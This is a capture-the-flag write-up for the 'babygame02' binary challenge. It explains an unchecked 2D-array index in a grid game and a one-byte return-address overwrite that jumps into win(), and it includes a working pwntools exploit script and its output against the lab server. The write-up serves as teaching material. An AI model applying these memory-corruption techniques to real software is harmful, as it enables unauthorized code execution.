# CyLab — babygame02

* **Platform:** CyLab Security Academy / picoCTF (Challenge ID: `346`)
* **Category:** Binary Exploitation / 2D Array OOB & Stack Epilogue Alignment (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB (pwndbg)
* **Binary:** `game` (32-bit x86 ELF)

---

## TL;DR

The game features an interactive $30 \times 90$ grid map stored on the stack where the player moves using `w/a/s/d`. In `move_player()`, tile updates are computed via `map[y * 90 + x] = player_tile` without enforcing boundary checks. Calculating the distance between the map base on the stack and the saved return address yields an offset of **$-39$ bytes** (`y = -1, x = 51`). Using the `'l'` command to change `player_tile` to `'p'` (`0x70`), we step onto the target coordinate to partially overwrite the least significant byte of `move_player`'s return address from `0x09` to `0x70`. This redirects execution to a NOP slide within `win()`, safely preserving caller frame pointers so that the process flushes standard I/O and outputs the flag upon completion.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file game
game: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=game
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Key observations:
1. **No Canary & No PIE:** Fixed base address at `0x08048000` with uninstrumented stack frames.
2. **Built-in Win Routine:** Function `win()` exists at `0x0804975d`, which reads and prints `flag.txt`.
3. **Out-of-Bounds Memory Canvas:** The 2D map buffer resides directly on the stack adjacent to local state variables and return addresses.

---

## Static Analysis & Vulnerability

### 1. Movement and Tile Logic

```c
void move_player(Player *p, char cmd, char *map) {
    // Erase player from old position
    map[p->y * 90 + p->x] = '.';

    // Update coordinates based on direction
    if (cmd == 'w') p->y--;
    else if (cmd == 's') p->y++;
    else if (cmd == 'a') p->x--;
    else if (cmd == 'd') p->x++;
    else if (cmd == 'l') {
        p->player_tile = getchar();     // Allows setting player tile to arbitrary byte
    }

    // VULNERABILITY: Unbounded write allows arbitrary negative stack indexing
    map[p->y * 90 + p->x] = p->player_tile;
}
```

### 2. Stack Layout & Offset Calculation

In GDB, examining the stack frame of `main()`:
- `map` buffer base: `main_ebp - 0xa95`
- Return address of `move_player()`: `main_ebp - 0xabc` (stored at the top of the stack during the call)

$$\text{Delta} = (\text{main\_ebp} - 0\text{x}abc) - (\text{main\_ebp} - 0\text{x}a95) = -0\text{x}abc + 0\text{x}a95 = -0\text{x}27 = -39 \text{ bytes}$$

To satisfy $y \times 90 + x = -39$:
$$\text{Let } y = -1 \implies -90 + x = -39 \implies x = 51$$

Target coordinate: $(y = -1, x = 51)$.

```text
       Stack Frame during move_player():
       
       [ move_player Return Address (4B) ]  <-- map[-39] = (y = -1, x = 51)
       ...
       [ map[0][0] Base Address          ]  <-- map[0]
       ...
       [ Player state (x, y, tile)       ]
```

### 3. The Stdout Buffering Trap (NOP Slide Trick)

Default return address from `move_player()` is `0x08049709`.
Target function `win()` begins at `0x0804975d`.
- **The Pitfall:** Overwriting the return address with `0x5d` executes `win()` from its function prologue (`push ebp; mov ebp, esp; sub esp, ...`). When `win()` finishes, its epilogue attempts to return to an unmapped stack pointer, triggering a `SIGSEGV` crash. Because standard I/O is block-buffered when piped across a network socket, the crash aborts the process before stdout flushes the flag!
- **The Solution:** Examining `win()` in disassembly reveals a NOP slide (`nop` instructions) from `0x0804976f` to `0x08049778`.
  By targeting `0x08049770` (ASCII `'p'`), we jump directly onto the NOP slide, **skipping the function prologue**.
  As a result, `win()` preserves `main()`'s original `ebp` and `ebx`. When `win()` executes `leave; ret`, it returns cleanly to `main()`'s caller, triggering `exit()` and forcing standard I/O to flush all buffered output across the socket.

---

## Dynamic Analysis & Exploitation Strategy

1. **Setting the Tile Character:**
   The starting player coordinates are $(4, 4)$.
   We issue command `'l'` followed by `'p'` (`0x70`), setting `player_tile = 0x70`.
2. **Navigating to Coordinate $(-1, 51)$:**
   - From $x = 4$ to $x = 51$: Move right 47 times (`'d' * 47`).
   - From $y = 4$ to $y = -1$: Move up 5 times (`'w' * 5`).
   - We traverse horizontally first to avoid crossing negative $x$ boundaries that might corrupt player state variables.
3. **Execution:**
   - The final `'w'` moves the player to $(-1, 51)$, executing `map[-39] = 'p'`.
   - The least significant byte of `move_player`'s return address is modified from `0x09` to `0x70`.
   - `move_player()` returns directly into the NOP slide of `win()`, printing `flag.txt` and flushing the buffer.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.log_level = "info"
HOST, PORT = "chatelaine.cylabacademy.net", 33412

def solve(io):
    # 'l' + 'p': set player_tile to 'p' (0x70)
    # 'd' * 47: move from x=4 to x=51
    # 'w' * 5: move from y=4 to y=-1
    # Hits map[-39] -> overwrites move_player retaddr LSB to 0x70 (NOP slide into win)
    payload = b"lp" + b"d" * 47 + b"w" * 5 + b"\n"

    io.send(payload)
    data = io.recvall(timeout=4)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 33412: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 33412
```

---

## Key Takeaways & Lessons

1. **Sub-Zero Stack Indexing in 2D Arrays:** Lack of signed coordinate validation allows 2D array calculations ($y \times \text{width} + x$) to index backwards into earlier stack frames, transforming games into arbitrary stack memory writers.
2. **Skipping Function Prologues for Safe Returns:** Overwriting return addresses to the body of a win function (skipping `push ebp; mov ebp, esp`) prevents destroying the parent stack frame, allowing graceful process termination and flushing of buffered standard I/O.
3. **Full Buffering over Sockets:** Standard C I/O libraries switch from line-buffered to fully-buffered mode when `stdout` is connected to a network socket. If an exploit causes a segmentation fault after reading the flag, the data remains stuck in libc's internal buffer unless flushed.
